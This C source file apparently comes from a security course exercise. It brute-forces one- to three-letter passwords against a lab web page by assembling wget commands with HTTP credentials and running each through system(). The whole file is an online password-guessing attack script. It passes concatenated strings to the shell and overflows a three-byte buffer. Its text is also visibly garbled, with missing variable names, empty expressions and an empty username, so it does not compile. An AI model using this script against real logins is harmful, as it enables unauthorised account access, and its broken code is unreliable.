#include<stdio.h>
#include<stdlib.h>
#include<string.h> 
#include <ctype.h>
#include <sys/time.h>


#define SUCCESS 0;
#define FAILURE 1;
#define SECONDS 1e9

int findPassword(char *);
int smallPass();
int capsPass();

int main()
{
	int foundP;	
	foundP=smallPass();
	foundP=capsPass();
	if(foundP == 2)
	{		
		return SUCCESS;
	}
	printf("\n PASSWORD NOT FOUND");
	return SUCCESS;
  
}

int smallPass()
{
	char [26] ={'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'};	
	char pass[3]="";	
	int i,j,k,l;
	int incr;
	int found;
	int , end, final;	
	
	 = time();
	for(j=0;j<3;j++)
	{
		incr=0;		
		for(i=0;i<=25;i++)
		{				
			if(j==0)
			{	
				incr++;
				pass[j]=[i];
				printf("\n Trial  %d  ---  %s ",incr,pass);
				found = findPassword(pass);
				if(found == 2)
				{	
					end = time();
					final = end-;
					printf(" %lld nanoseconds (%1f seconds)  find the Password\n",final,(double) final / SECONDS);
					printf("\nPASSWORD FOUND   --   %s",pass);				
					return 2;
				}
				
			}
			if(j==1)
			{				
				pass[j-1]=[i];
				for(k=0;k<=25;k++)
				{
					incr++;
					pass[j] = [k];
					printf("\n Trial  %d  ---  %s ",incr,pass);
					found = findPassword(pass);
					if(found == 2)
					{	
						end = time();
						final = end-;
						printf(" %lld nanoseconds (%1f seconds)  find the Password\n",final,(double) final / SECONDS);
						printf("\nPASSWORD FOUND   --   %s",pass);			
						return 2;
					}	
				}
			}
			if(j==2)
			{						
				pass[j-2]=[i];
				for(k=0;k<=25;k++)
				{
					pass[j-1] = [k];
					for(l=0;l<=25;l++)
					{
						incr++;
						pass[j] = [l];
						pass[j+1]='\0';
						printf("\n Trial  %d  ---  %s ",incr,pass);
						found = findPassword(pass);
						if(found == 2)
						{	
							end = time();
							final = end-;
							printf(" %lld nanoseconds (%1f seconds)  find the Password\n",final,(double) final / SECONDS);					
							printf("\nPASSWORD FOUND   --   %s",pass);						
							return 2;
						}
					}	
				}
			}		
			
			
		}
	}
	
	return SUCCESS;	
}



int capsPass()
{
	char caps[26] ={'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'};	
	char pass[3]="";	
	int i,j,k,l;
	int incr;
	int found;
	int , end, final;	
	
	 = time();
	for(j=2;j<3;j++)
	{
		incr=0;
		for(i=0;i<=25;i++)
		{
				
			if(j==0)
			{	
				incr++;
				pass[j]=caps[i];
				printf("\n Trial  %d  ---  %s ",incr,pass);
				found = findPassword(pass);
				if(found == 2)
				{	
					end = time();
					final = end-;
					printf(" %lld nanoseconds (%1f seconds)  find the Password\n",final,(double) final / SECONDS);
					printf("\nPASSWORD FOUND   --   %s",pass);				
					return 2;
				}
				
			}
			if(j==1)
			{				
				pass[j-1]=caps[i];
				for(k=0;k<=25;k++)
				{
					incr++;
					pass[j] = caps[k];
					printf("\n Trial  %d  ---  %s ",incr,pass);
					found = findPassword(pass);
					if(found == 2)
					{	
						end = time();
						final = end-;
						printf(" %lld nanoseconds (%1f seconds)  find the Password\n",final,(double) final / SECONDS);
						printf("\nPASSWORD FOUND   --   %s",pass);			
						return 2;
					}	
				}
			}
			if(j==2)
			{				
				pass[j-2]=caps[i];
				for(k=0;k<=25;k++)
				{
					pass[j-1] = caps[k];
					for(l=0;l<=25;l++)
					{
						incr++;
						pass[j] = caps[l];
						pass[j+1]='\0';
						printf("\n Trial  %d  ---  %s ",incr,pass);
						found = findPassword(pass);
						if(found == 2)
						{	
							end = time();
							final = end-;
							printf(" %lld nanoseconds (%1f seconds)  find the Password\n",final,(double) final / SECONDS);
							printf("\nPASSWORD FOUND   --   %s",pass);						
							return 2;
						}
					}	
				}
			}		
			
			
		}
	}
	
	return SUCCESS;	
}


int findPassword(char *pass)
{
	char var[50]="";	
	char [50]="";
	strcpy(var,"wget --non-verbose --http-user= --http-passwd=");		
	strcpy(," http://sec-crack.cs.rmit.edu./SEC/2/index.php");
	strcat(var,pass);
	strcat(var,);
	if(system(var)==0)
	{		
		return 2;
	}	
		
	return SUCCESS;
}


	 
